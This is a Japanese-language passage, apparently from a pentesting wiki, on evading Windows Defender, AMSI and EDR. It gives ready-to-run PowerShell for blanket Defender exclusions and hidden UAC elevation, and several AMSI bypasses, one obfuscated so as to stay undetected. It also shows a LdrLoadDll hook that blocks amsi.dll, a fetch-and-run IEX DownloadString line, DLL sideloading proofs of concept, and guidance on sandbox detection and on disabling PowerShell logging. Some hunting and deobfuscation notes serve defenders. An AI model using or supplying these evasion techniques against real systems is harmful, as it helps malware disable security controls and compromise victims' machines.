# Antivirus (AV) の回避

{{#include ../banners/hacktricks-training.md}}

**このページの初稿は** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました！**

## Defender の停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を装って Windows Defender の動作を停止するツール。
- [管理者権限がある場合に Defender を無効化する](basic-powershell-for-pentesters/README.md)

### Defender の改変前にインストーラー風の UAC 誘導を行う

ゲームチートを装う公開ローダーは、署名されていない Node.js/Nexe インストーラーとして配布され、まず**ユーザーに昇格を求めてから** Defender を無力化することがよくあります。流れはシンプルです。

1. `net session` を使って管理者コンテキストかどうかを確認します。このコマンドは実行ユーザーが管理者権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 直ちに `RunAs` 動詞を指定して自身を再起動し、元のコマンドラインを維持したまま、想定される UAC の同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「cracked」ソフトウェアをインストールしていると信じているため、通常はプロンプトを承認し、マルウェアにDefenderのポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の `MpPreference` 除外設定

昇格後、GachiLoader型の攻撃チェーンはサービスを完全に無効化するのではなく、Defenderの死角を最大限に広げます。ローダーはまずGUIウォッチドッグ（`taskkill /F /IM SecHealthUI.exe`）を停止し、その後、**非常に広範囲な除外設定**を適用して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします：

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- このループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置されるペイロードはすべて無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、後からDefenderに再度触れることなく、署名のないドライバーを読み込めるようにしておきます。
- 変更はすべて `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続のステージで除外設定が維持されていることを確認したり、UACを再度起動させずに除外対象を増やしたりできます。

Defenderのサービスは停止されないため、単純なヘルスチェックでは「antivirus active」と表示され続けますが、実際にはリアルタイム検査がこれらのパスに対して機能しません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AVは、ファイルが悪意のあるものかどうかを判定するために、静的検知、動的解析、そして高度なEDRでは振る舞い分析など、さまざまな方法を使用しています。

### **Static detection**

静的検知では、バイナリやスクリプトに含まれる既知の悪意ある文字列やバイト配列を検出するほか、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、既知の公開ツールを使うと、すでに解析され、悪意あるものとして検出対象にされている可能性が高く、検出されやすくなります。この種の検知を回避する方法はいくつかあります。

- **Encryption**

バイナリを暗号化すれば、AVがプログラムを検出する方法はなくなりますが、メモリ上でプログラムを復号して実行するためのloaderが必要になります。

- **Obfuscation**

バイナリやスクリプト内の文字列をいくつか変更するだけでAVをすり抜けられる場合もありますが、難読化しようとする対象によっては時間のかかる作業になります。

- **Custom tooling**

独自のツールを開発すれば、既知の不正なシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検知を確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。ファイルを複数のセグメントに分割し、それぞれをDefenderにスキャンさせます。これにより、バイナリ内で検出対象となっている文字列やバイトを正確に把握できます。

実践的なAV Evasionについては、この[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### **Dynamic analysis**

動的解析とは、AVがバイナリをsandbox内で実行し、悪意ある動作（ブラウザーのパスワードを復号して読み込もうとする、LSASSに対してminidumpを実行するなど）がないかを監視することです。この部分への対処は少し難しい場合がありますが、sandboxを回避するためにできることをいくつか紹介します。

- **実行前にsleepする** 実装方法によっては、AVの動的解析を回避する有効な方法になります。AVはユーザーの作業を妨げないよう、ファイルのスキャンに使える時間が非常に短いため、長いsleepを入れるとバイナリの解析を妨げられます。ただし、AVのsandboxの多くは実装方法によってsleepをスキップできる点が問題です。
- **マシンのリソースを確認する** 通常、sandboxに割り当てられるリソースは非常に少なく（例：RAMが2GB未満）、そうでないとユーザーのマシンの動作が遅くなる可能性があります。ここでは、たとえばCPU温度やファンの回転速度を確認するなど、工夫の余地があります。sandbox内ではすべてが実装されているとは限りません。
- **マシン固有のチェックを行う** 「contoso.local」ドメインに参加しているユーザーのワークステーションを標的にしたい場合、コンピューターのドメインを確認し、指定したものと一致するかを調べられます。一致しなければ、プログラムを終了させます。

Microsoft Defenderのsandboxのコンピューター名はHAL9THです。そのため、実行前にマルウェアでコンピューター名を確認できます。名前がHAL9THと一致する場合はDefenderのsandbox内にいることを意味するので、プログラムを終了させられます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

sandboxへの対策について、[@mgeeky](https://twitter.com/mariuszbit)によるその他の優れたヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この記事でも前述したとおり、**公開ツール**はいずれ**検出されます**。そこで、次のことを自問してください。

たとえば、LSASSをdumpしたい場合、**本当にmimikatzを使う必要があるでしょうか**？ あるいは、あまり知られていない別のプロジェクトでLSASSをdumpできないでしょうか。

おそらく、後者が正解です。mimikatzを例にすると、AVやEDRに最も多く検出されるマルウェアの一つ、おそらくはその筆頭です。プロジェクト自体は非常に優れていますが、AVを回避しながら使うのは非常に厄介です。そのため、達成したいことに応じて代替手段を探してください。

> [!TIP]
> 回避のためにペイロードを変更するときは、Defenderの**サンプルの自動送信をオフにしてください**。また、長期的に検出を回避することが目的なら、**絶対にVIRUSTOTALにアップロードしないでください**。特定のAVにペイロードが検出されるか確認したい場合は、VMにそのAVをインストールし、サンプルの自動送信をオフにできるか試したうえで、満足できる結果になるまでそこでテストしてください。

## EXEs vs DLLs

可能であれば、回避には常に**DLLを優先してください**。私の経験では、DLLファイルは通常**検出や解析を受ける可能性がかなり低い**ため、ペイロードをDLLとして実行する方法がある場合は、検出回避のために使える非常に簡単な手段です。

この画像のとおり、HavocのDLL Payloadはantiscan.meで検出率が4/26であるのに対し、EXE payloadの検出率は7/26です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadと通常のHavoc DLLのantiscan.meでの比較</p></figcaption></figure>

ここからは、DLLファイルを使ってさらにステルス性を高めるためのテクニックをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、loaderが使用するDLL search orderを利用し、対象アプリケーションと悪意あるペイロードを隣り合わせに配置します。

[Siofra](https://github.com/Cybereason/siofra)と次のpowershell scriptを使うと、DLL Sideloadingの影響を受けやすいプログラムを確認できます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けるプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable programs を自分で調べることを強くおすすめします**。この technique は適切に行えばかなり stealthy ですが、公開されている DLL Sideloadable programs を使うと、簡単に見つかる可能性があります。

プログラムが読み込もうとする名前の malicious DLL を配置するだけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数があることを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使います。

**DLL Proxying** は、プログラムが proxy（malicious）DLL に対して行う呼び出しを元の DLL に転送します。これにより、プログラムの機能を維持しながら payload の実行も処理できます。

[@flangvik](https://twitter.com/flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した手順です。

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで2つのファイルが得られます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

shellcode（[SGN](https://github.com/EgeBalci/sgn)でエンコード）とproxy DLLの両方が、[antiscan.me](https://antiscan.me)で検出率0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについて詳しく学ぶために、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)も見ることを**強くおすすめします**。これらでは、今回説明した内容をさらに掘り下げています。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PEモジュールは、実際には「forwarder」である関数をエクスポートできます。コードを指す代わりに、エクスポートエントリには`TargetDll.TargetFunc`形式のASCII文字列が格納されています。呼び出し元がエクスポートを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていなければロードする
- そこから`TargetFunc`を解決する

理解しておくべき主な動作:
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespace（例: ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合、通常のDLL search orderが使用されます。この検索順には、forward解決を行うモジュールのディレクトリが含まれます。

これにより、間接的なsideloadingの手法が可能になります。KnownDLLではないモジュール名にforwardされる関数をエクスポートする署名済みDLLを見つけ、その署名済みDLLと同じ場所に、forward先のモジュールと完全に同じ名前を付けた攻撃者制御のDLLを配置します。forwardされたエクスポートが呼び出されると、loaderはforward先を解決し、同じディレクトリからDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。コードを実行するには、最小限の `DllMain` で十分です。`DllMain` をトリガーするために、転送先関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みのLOLBinでforwardを起動する:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32（署名付き）が side-by-side の `keyiso.dll`（署名付き）を読み込む
- `KeyIsoSetAuditingInterface` の解決中、ローダーは転送先の `NCRYPTPROV.SetAuditingInterface` をたどる
- その後、ローダーは `C:\test` から `NCRYPTPROV.dll` を読み込み、`DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、「missing API」エラーが発生するのは、すでに `DllMain` が実行された後

Hunting tips:
- 転送先のモジュールが KnownDLL ではない、転送エクスポートに注目してください。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` にあります。
- 次のようなツールを使って、転送エクスポートを列挙できます。
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 の forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知/防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム外のパスから署名済み DLL を読み込み、その後、そのディレクトリから同じベース名の非 KnownDLLs を読み込む動作を監視する
- 次のようなプロセス/モジュールの連鎖を検知する: `rundll32.exe` → システム外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、suspended processes、direct syscalls、代替の実行方法を使用して EDR を回避するための payload toolkit です`

Freeze を使用すると、ステルス性を保ちながら shellcode を読み込んで実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこのようなもので、今日有効な手法も明日には検出される可能性があります。そのため、1つのツールだけに頼らず、可能であれば複数のevasion techniqueを組み合わせてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRはしばしば、`ntdll.dll`のsyscall stubに**user-mode inline hook**を設置します。これらのhookを回避するには、正しい**SSN**（System Service Number）を読み込み、hookされたexportのエントリポイントを実行せずにkernel modeへ移行する**direct**または**indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成したstub内に`syscall`/`sysenter`/`SVC #0`命令を出力します（`ntdll`のexportを通りません）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへジャンプし、kernelへの移行が`ntdll`から発生したように見せます（heuristic evasionに有用）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な`0F 05` opcode sequenceをディスク上に埋め込まず、runtimeにsyscall sequenceを解決します。

**hook耐性のあるSSN解決戦略:**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual address順にソートしてSSNを推定します。
- **SyscallsFromDisk**: クリーンな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取ってからunmapします（メモリ上のすべてのhookを回避します）。
- **RecycledGate**: VA順のSSN推定と、stubがクリーンな場合のopcode検証を組み合わせます。hookされている場合はVA推定にフォールバックします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使ってruntimeに`EAX`からSSNを取得します。hookされたbyteの解析は不要です。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけでした。そのため、payloadを**メモリ上で直接**実行できれば、AVには十分な可視性がなく、阻止できませんでした。

AMSI機能は、Windowsの次のコンポーネントに統合されています。

- User Account Control（UAC）（EXE、COM、MSI、またはActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話的な使用、動的コード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、ウイルス対策ソリューションは、暗号化も難読化もされていない形式でスクリプトの内容を取得し、その動作を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` の後に、スクリプトの実行元である実行ファイルのパスが付いている点に注目してください。この場合はpowershell.exeです。

ディスクにはファイルを一切書き込みませんでしたが、AMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通じて実行されます。これは、メモリ上で実行するための`Assembly.Load(byte[])`にも影響します。そのため、AMSIを回避してメモリ上で実行する場合は、低いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **難読化**

AMSIは主に静的検知を行うため、読み込もうとするスクリプトを変更することで、検知を回避できる場合があります。

ただし、AMSIには複数の層があるスクリプトでも難読化を解除する機能があるため、やり方によっては難読化が有効な選択肢にならないこともあります。そのため、回避はそれほど簡単ではありません。一方で、変数名をいくつか変更するだけでうまくいく場合もあるため、どの程度検知対象としてフラグが立てられているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなども含む）プロセスに読み込むことで実装されているため、非特権ユーザーとして実行していても簡単に改ざんできます。このAMSIの実装上の欠陥により、研究者たちはAMSIスキャンを回避する方法を複数発見しました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。これは当初、[Matt Graeber](https://twitter.com/mattifestation)によって公開され、その後Microsoftは広く利用されるのを防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

現在のpowershellプロセスでAMSIを使用不能にするには、powershellのコードを1行実行するだけで十分でした。当然、この行自体がAMSIに検知されるため、このtechniqueを使うには何らかの変更が必要です。

以下は、[このGithub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から引用した、改変版のAMSI bypassです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この手法は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。amsi.dll 内の「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを探し、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell でバイパスする手法はほかにも数多くあります。詳しくは[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**このリポジトリ**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しないバイパス方法は、`ntdll!LdrLoadDll` にユーザーモード hook を設定し、要求されたモジュールが `amsi.dll` の場合にエラーを返すことです。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ 疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、カスタムローダーなど、AMSIを読み込むものすべてで動作します。
- 長いコマンドラインの痕跡を避けるため、スクリプトを stdin 経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせてください。
- `DllRegisterServer` を呼び出す `regsvr32` など、LOLBins 経由で実行されるローダーでの使用例があります。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** も、ランダム化されたユーザー定義関数、変数、文字式を使ってシグネチャを回避し、PowerShell キーワードの大文字・小文字をランダムに変更してシグネチャを避ける、AMSIバイパス用のスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使って、現在のプロセスのメモリから検出された AMSI シグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、NOP 命令で上書きすることで、メモリから実質的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使う**

PowerShell version 2 を使うと、AMSIは読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行できます：

```bash
powershell.exe -version 2
```

## PSログ記録

PowerShellのログ記録は、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題となる可能性もあります**。

PowerShellのログ記録を回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効にする**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) などのツールを使用できます。
- **PowerShell version 2を使用する**: PowerShell version 2ではAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **アンマネージドPowerShellセッションを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使うと、`powershell.exe`を起動せずにPowerShellをホストできます（Cobalt Strikeの`powerpick`で使われている手法）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が自動的に無効になるわけではありません。カバー範囲はランタイムとホストの実装によって異なります。


## 難読化

> [!TIP]
> いくつかの難読化手法ではデータを暗号化するため、バイナリのエントロピーが上がり、AVやEDRに検知されやすくなります。この点に注意し、暗号化はコード内の機密性の高い部分や隠す必要のある部分にだけ適用することを検討してください。

### ConfuserExで保護された.NETバイナリの難読化解除

ConfuserEx 2（または商用フォーク）を使用するマルウェアを解析する際には、逆コンパイラーやサンドボックスを妨げる複数の保護レイヤーに遭遇することがよくあります。以下の手順により、**ほぼ元の状態のILを確実に復元**でき、その後、dnSpyやILSpyなどのツールでC#に逆コンパイルできます。<sup>[[10]](#references)</sup>

1.  アンチタンパリングの除去 – ConfuserExはすべての*メソッド本体*を暗号化し、*モジュール*の静的コンストラクター（`<Module>.cctor`）内で復号します。また、PEチェックサムにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使用して暗号化されたメタデータテーブルを特定し、XORキーを復元して、クリーンなアセンブリを書き込みます:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自の unpacker を作成する際に役立つ6つの anti-tamper パラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれています。

2.  シンボル / 制御フローの復元 – *clean* ファイルを **de4dot-cex**（ConfuserEx 対応の de4dot フォーク）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   フラグ:
     • `-p crx` – ConfuserEx 2 プロファイルを選択
     • de4dot は制御フローの平坦化を解除し、元の名前空間、クラス、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は直接のメソッド呼び出しを軽量なラッパー（別名 *proxy calls*）に置き換え、逆コンパイルをさらに困難にします。**ProxyCall-Remover** で削除します:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、`Class8.smethod_10` などの不透明なラッパー関数ではなく、`Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`／`TripleDESCryptoServiceProvider` の使用箇所を検索して、*本物の* payload を見つけます。マルウェアは多くの場合、`<Module>.byte_0` 内で初期化される TLV エンコード済みバイト配列としてこれを保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業する際に便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これを IOC として使用し、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトは、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)とtamper-proofingによってソフトウェアセキュリティを強化できる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供することを目的としています。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラを変更することなく、`C++11/14`言語を使ってコンパイル時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkで生成されたobfuscated operationsのレイヤーを追加し、アプリケーションをcrackしようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなPEファイルをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイル向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用してLLVM対応言語のコードを細粒度でobfuscateするframeworkです。ROPfuscatorは、通常の命令をROP chainに変換してassembly codeレベルでプログラムをobfuscateし、通常のcontrol flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、ロードできます。

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけmaskする代わりに、変更されたLLVM X86 backendは、選択した関数が非アクティブな間、関数ごとにXORでmaskされた状態を維持できます。Function Peekaboo PoCは、demangle後の名前に`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubを挿入して、共有masking handlerを`.text`に1つ出力します。ソースレベルのsignatureとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理はinstruction selectionとoptimizationの後に行う必要があります。変換ですべての出力済みreturnを処理し、正確なx86レイアウトを把握する必要があるためです。emission前の`MachineFunctionPass`は最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加されたepilogueへフォールスルーするようにします。また、それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラが生成したstack/frameのteardownは残し、return命令自体のみをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

